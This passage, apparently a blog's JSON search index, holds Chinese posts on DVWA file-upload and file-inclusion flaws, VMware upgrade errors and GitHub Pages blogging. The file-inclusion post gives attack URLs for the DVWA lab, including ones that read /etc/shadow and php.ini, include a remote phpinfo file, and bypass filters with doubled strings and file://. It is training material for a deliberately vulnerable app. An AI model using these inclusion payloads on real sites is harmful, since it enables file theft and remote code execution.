9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;a href='${target_path}${target_file}'\u0026gt;${target_file}\u0026lt;/a\u0026gt; succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026quot;; } else { // No echo '\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo '\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  in_get(varname)\n函数返回相应选项的值\nimagecreatefromjpeg ( filename )\n函数返回图片文件的图像标识，失败返回false\nimagejpeg ( image , filename , quality)\n从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。\nimagedestroy( img )\n函数销毁图像资源\n可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwaupload/","tags":["DVWA"],"title":"从DVWA看文件上传漏洞"},{"content":"File Inclusion File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。\nLow \u0026lt;?php // The page we wish to display $file = $_GET[ 'page' ]; ?\u0026gt;  可以看到，服务器端对page参数没有做任何的过滤跟检查。\n服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。\n点击file1.php后，显示如下\n而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。\n漏洞利用 1、本地文件包含\n构造url\nhttp://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/shadow  报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径E:\\phpstudy\\phpstudy_pro 。\n构造url（绝对路径）E:\\phpstudy\\phpstudy_pro\nhttp://localhost/DVWA-master/vulnerabilities/fi/?page=E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\DVWA-master\\php.ini  成功读取了服务器的php.ini文件\n构造url（相对路径）\nhttp://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=..\\..\\phpinfo.php  2、远程文件包含\n当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。\n在本地服务器127.0.0.1上传一个phpinfo.txt文件，内容如下\n\u0026lt;?php phpinfo(); ?\u0026gt;  构造url\nhttp://192.168.43.73/DVWA-master/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt  Medium \u0026lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( \u0026quot;http://\u0026quot;, \u0026quot;https://\u0026quot; ), \u0026quot;\u0026quot;, $file ); $file = str_replace( array( \u0026quot;../\u0026quot;, \u0026quot;..\\\u0026quot;\u0026quot; ), \u0026quot;\u0026quot;, $file ); ?\u0026gt;  可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\\”替换为空字符，即删除。\n漏洞利用 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。\n例如page=hthttp://tp://192.168.43.73/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.43.73/phpinfo.txt，成功执行远程命令。\n同时，因为替换的只是“../”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。\n1.本地文件包含\nhttp://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=..././..././php.ini  2、远程文件包含\nhttp://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt  High \u0026lt;?php if(!function_exists('fnmatch')) { function fnmatch($pattern, $string) { return preg_match(\u0026quot;#^\u0026quot;.strtr(preg_quote($pattern, '#'),array('\\*' =\u0026gt; '.*', '\\?'=\u0026gt; '.')).\u0026quot;$#i\u0026quot;, $string); } // end } // end if // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( \u0026quot;file*\u0026quot;, $file ) \u0026amp;\u0026amp; $file != \u0026quot;include.php\u0026quot; ) { // This isn't the page we want! echo \u0026quot;ERROR: File not found!\u0026quot;; exit; } ?\u0026gt;  可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。\n漏洞利用 High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。\n构造url\nhttp://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=file:///../../php.ini  利用file协议绕过\nImpossible \u0026lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Only allow include.php or file{1..3}.php if( $file != \u0026quot;include.php\u0026quot; \u0026amp;\u0026amp; $file != \u0026quot;file1.php\u0026quot; \u0026amp;\u0026amp; $file != \u0026quot;file2.php\u0026quot; \u0026amp;\u0026amp; $file != \u0026quot;file3.php\u0026quot; ) { // This isn't the page we want! echo \u0026quot;ERROR: File not found!\u0026quot;; exit; } ?\u0026gt;  可以看到，impossible级别的代码使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwainclude/","tags":["DVWA"],"title":"从DVWA看文件包含漏洞"},{"content":"报错1 无法打开内核设备“\\.\\VMCIDev\\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗?\n这里打开以.vmx结尾的文件，如下图\n搜索 vmci0.present，把后面的 TRUE 替换成 FALSE，如下图：\n再打开就好\n报错2 errors:\n VMware Workstation 不可恢复错误: (vmx)\nException 0xc0000006 (disk error while paging) has occurred.\n日志文件位于“K:\\vmware\\centos\\vmware.log”中。\n您可以请求支持。\n 因为我当时的虚拟机都是处于挂起状态，这里直接给当前虚拟机关机，再启动就好，看了看里面的快照什么的也没有丢失\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/vmware%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/","tags":["奇奇怪怪的问题"],"title":"关于VMware由15版本更新到16版本的报错问题"},{"content":"教大家如何来使用Github Pages和Gridea来搭建个人博客\n1 关于Github Pages\n来看看官方的介绍：\n GitHub Pages 是一项静态站点托管服务，它直接从 GitHub 上的仓库获取 HTML、CSS 和 JavaScript 文件，（可选）通过构建过程运行文件，然后发布网站。\n emmm，不废话了，总之，GitHub Pages会发布您推送到代码仓库的任何静态文件，你可以创建自己的静态文件或使用静态站点生成器（如Hexo）为你构建站点，然后就可以使用github.io域名访问你的博客网站了。对了，是免费的哦~\n2 关于Gridea\n Gridea 是一个静态博客写作客户端，帮助你更容易地构建并管理博客或任何静态站点。\n Gridea的方便就在于可以使用客户端直接编写代码，然后只要点击按钮就能发布，非常人性化。重要的是，其提供了Windows、Mac OS和Linux三种操作系统的客户端。Gridea的界面是这样的：\n怎么样？是不是非常小清新？是不是迫不及待地想要开始了？！\n3 开始动手吧\n3.1 注册Github账号\n先去全球最大的程序员交友平台——Github上注册一个账号，登录。\n3.2 创建仓库token\n登录后，先进入创建token的页面，然后填写Note（相当于是个提示吧，因为你可能有多个token，便于区分用途），勾上repo即可，往下拉点Generate token。 然后点这个图标先复制，先保存起来吧，不然你下次再点开就看不到了，得重新生成。\n3.3 创建代码仓库\n点击右上角头像左边的+号，然后选择New repository。\n填写好信息，点下面的Create repository。\n 注意：Repository name填你的用户名.github.io，Description不填也行。\n 创建成功后，就是只有一个只有README.md的仓库，这时你就可以在浏览器访问你的用户名.github.io，可以看到下面内容，就可以了。\n3.3 运行Gridea\n去Gridea的官网下载你操作系统对应的安装包，安装，运行。第一次使用要进行配置，点击远程进行配置。\n 平台要选Github Pages，域名和仓库名称填你的用户名.github.io，分支填master，令牌就是刚刚要你复制的token。另外你要绑定域名的话，CNAME就填你的域名。\n 填写完成后，点保存，然后监测一下远程连接，没问题的话就点左下角的同步。\n这样你就可以访问你的用户名.github.io来打开你的博客网站了，如果你设置了CNAME，就是访问你的域名。文章的管理就可以直接在这个客户端上操作，同时也可以选择你喜欢的主题，自己多去研究研究吧，哈哈。另外，附上一些答疑。\n大家可以看到，我写的这个教程主要是发的截图，根本不需要写代码，这就是使用Gridea的好处。\nOK，接下来你就自己去折腾你的博客吧\n本文转载自：https://zhuanlan.zhihu.com/p/165948546\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/gridea%E6%90%AD%E5%8D%9A%E5%AE%A2/","tags":["博客搭建"],"title":"完全小白教程：使用Github Pages和Gridea搭建个人博客"}]